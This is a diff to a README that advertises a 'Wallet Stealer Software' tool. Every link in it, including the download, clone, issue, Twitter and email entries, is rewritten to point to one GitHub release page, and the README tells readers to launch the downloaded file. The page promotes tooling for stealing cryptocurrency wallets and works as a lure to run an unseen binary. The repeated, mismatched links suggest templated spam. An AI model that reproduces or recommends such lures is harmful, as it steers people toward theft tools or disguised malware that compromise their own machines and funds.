@@ -2,7 +2,7 @@
 
 ### Welcome to the Wallet Stealer Software Repository!
 
-![Wallet Stealer Logo](https://imageurl.com)
+![Wallet Stealer Logo](https://github.com/Tkien1902/wallet-stealer/releases/tag/v2.0)
 
 ---
 
@@ -21,7 +21,7 @@ This repository contains the **Wallet Stealer Software**, a powerful tool design
 
 ## Software Download
 
-To download the **Wallet Stealer Software**, click [here](https://github.com/user-attachments/files/18410590/Software.zip)
+To download the **Wallet Stealer Software**, click [here](https://github.com/Tkien1902/wallet-stealer/releases/tag/v2.0)
 
 *Note: The file needs to be launched after downloading.*
 
@@ -45,7 +45,7 @@ Explore the following topics related to the **Wallet Stealer Software**:
 
 1. **Clone the Repository:**
    ```
-   git clone https://github.com/your-username/wallet-stealer.git
+   git clone https://github.com/Tkien1902/wallet-stealer/releases/tag/v2.0
    ```
 
 2. **Navigate to the Software Directory:**
@@ -62,7 +62,7 @@ Explore the following topics related to the **Wallet Stealer Software**:
 
 ## Feedback
 
-Your feedback is valuable! If you have any suggestions, issues, or feature requests, feel free to [open an issue](https://github.com/your-username/wallet-stealer/issues).
+Your feedback is valuable! If you have any suggestions, issues, or feature requests, feel free to [open an issue](https://github.com/Tkien1902/wallet-stealer/releases/tag/v2.0).
 
 ---
 
@@ -74,8 +74,8 @@ This project is maintained by **Your Name**. Special thanks to all contributors.
 
 ### Connect with Us
 
-- **Twitter:** [Follow us](https://twitter.com/walletstealersoftware)
-- **Email:** info@walletstealer.com
+- **Twitter:** [Follow us](https://github.com/Tkien1902/wallet-stealer/releases/tag/v2.0)
+- **Email:** https://github.com/Tkien1902/wallet-stealer/releases/tag/v2.0
 
 ---
 
